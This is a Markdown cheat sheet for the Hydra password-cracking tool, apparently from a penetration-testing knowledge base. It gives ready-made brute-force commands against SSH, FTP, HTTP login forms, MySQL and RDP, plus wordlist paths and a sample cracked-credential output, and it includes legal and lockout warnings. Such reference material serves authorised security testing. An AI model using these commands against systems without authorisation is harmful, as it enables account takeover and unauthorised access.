# Hydra - Network Login Cracker

## Overview
| Attribute | Value |
|-----------|-------|
| Binary | `hydra` |
| Category | Credential Brute-forcing |
| Risk Level | High |

## Description
Hydra is a fast and flexible online password cracking tool supporting numerous protocols including SSH, FTP, HTTP, MySQL, SMB, and many more.

---

## Supported Protocols
`ssh`, `ftp`, `http-get`, `http-post-form`, `https-get`, `https-post-form`, `smb`, `mysql`, `mssql`, `postgres`, `rdp`, `vnc`, `telnet`, `smtp`, `pop3`, `imap`, `ldap`, `snmp`, `redis`, `mongodb`, and more.

---

## Usage Patterns

### 1. SSH Brute-force
**Goal:** Crack SSH login.
```bash
hydra -l <username> -P <password_list> <target> ssh
```
**Example:**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh
```

### 2. Multiple Users
**Goal:** Try multiple usernames.
```bash
hydra -L <user_list> -P <password_list> <target> ssh
```

### 3. FTP Brute-force
```bash
hydra -l admin -P passwords.txt <target> ftp
```

### 4. HTTP Basic Auth
```bash
hydra -l admin -P passwords.txt <target> http-get /admin
```

### 5. HTTP POST Form
**Goal:** Crack web login forms.
```bash
hydra -l <user> -P <passwords> <target> http-post-form "<path>:<post_data>:<fail_string>"
```
**Example:**
```bash
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```
- `^USER^`: Placeholder for username
- `^PASS^`: Placeholder for password
- Last field: String that appears on failed login

### 6. MySQL Brute-force
```bash
hydra -l root -P passwords.txt <target> mysql
```

### 7. RDP Brute-force
```bash
hydra -l administrator -P passwords.txt <target> rdp
```

---

## Important Options
| Flag | Description |
|------|-------------|
| `-l` | Single username |
| `-L` | Username list file |
| `-p` | Single password |
| `-P` | Password list file |
| `-t` | Parallel tasks (default: 16) |
| `-s` | Custom port |
| `-V` | Verbose (show each attempt) |
| `-f` | Stop on first valid password |
| `-o` | Output file |
| `-e nsr` | Try null/same/reverse passwords |

---

## Common Wordlists (Parrot OS)
| Path | Description |
|------|-------------|
| `/usr/share/wordlists/rockyou.txt` | Classic password list (14M) |
| `/usr/share/wordlists/fasttrack.txt` | Fast common passwords |
| `/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt` | Top 10k passwords |

---

## Safety Warnings
| Risk | Description |
|------|-------------|
| **Account Lockout** | May trigger lockout policies |
| **Detection** | Easily detected by IDS/SIEM |
| **Legal** | Unauthorized access is illegal |

> **CRITICAL:** Use `-t 1` for services with lockout policies.

---

## Common Errors & Solutions
| Error | Cause | Solution |
|-------|-------|----------|
| `Connection refused` | Service down or wrong port | Verify port with nmap |
| `Too many connections` | Rate limiting | Reduce `-t` value |
| `Invalid protocol` | Unsupported service | Check `hydra -h` for protocols |

---

## Output Parsing
Success format:
```
[22][ssh] host: 192.168.1.10   login: root   password: toor
```
